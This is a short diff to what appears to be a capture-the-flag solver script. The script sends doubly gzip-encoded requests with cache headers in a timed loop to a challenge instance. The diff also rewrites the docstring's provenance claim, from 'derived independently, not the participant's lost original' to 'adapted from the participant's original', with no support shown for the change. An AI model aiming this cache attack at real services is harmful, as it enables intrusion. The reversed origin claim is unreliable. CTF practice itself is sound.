@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""Frozen Query double-gzip cache hit — original reconstruction.
+"""Frozen Query double-gzip cache hit — configurable adaptation.
 
 Usage: pip install requests
        python3 solve.py https://YOUR-CHALLENGE-INSTANCE --seconds 20
 No network traffic unless a URL is explicitly provided.
 
-Derived independently from the published D23R walk-through, NOT the
-participant's lost original solver.
+Adapted from the participant's original exploit_frozen_query.py, now
+preserved alongside it.
 """
 import argparse
 import gzip
@@ -24,7 +24,8 @@ def main():
     end=time.monotonic()+args.seconds
     headers={"Content-Type":"application/vnd.glacier.bulletin+json",
              "Accept":"application/json",
-             "Content-Encoding":"gzip, gzip"}
+             "Content-Encoding":"gzip, gzip",
+             "Cache-Control":"max-age=0"}
     with requests.Session() as session:
         while time.monotonic()<end:
             now=int(time.time()//30)
